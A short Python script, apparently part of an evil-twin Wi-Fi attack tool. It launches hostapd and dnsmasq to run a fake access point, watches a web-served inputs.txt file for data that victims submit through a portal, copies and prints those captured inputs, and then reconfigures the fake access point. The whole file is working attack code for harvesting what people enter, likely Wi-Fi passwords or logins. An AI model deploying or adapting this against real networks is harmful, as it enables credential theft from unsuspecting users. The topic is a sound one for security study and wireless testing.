from os import system, path
from sys import argv
from time import sleep
from conf import fake_ap_reconfiguration

if __name__ == '__main__': 
    iface = argv[1]
    system('hostapd ./conf/hostapd.conf -B')
    system('dnsmasq -C ./conf/dnsmasq.conf')
    while True:
        curr_size = path.getsize('/var/www/html/inputs.txt')
        
        while path.getsize('/var/www/html/inputs.txt') == curr_size:
            sleep(1)
        system('cat /var/www/html/inputs.txt > ./inputs.txt')
        system('echo saved inputs:')
        system('cat ./inputs.txt')
        fake_ap_reconfiguration(iface)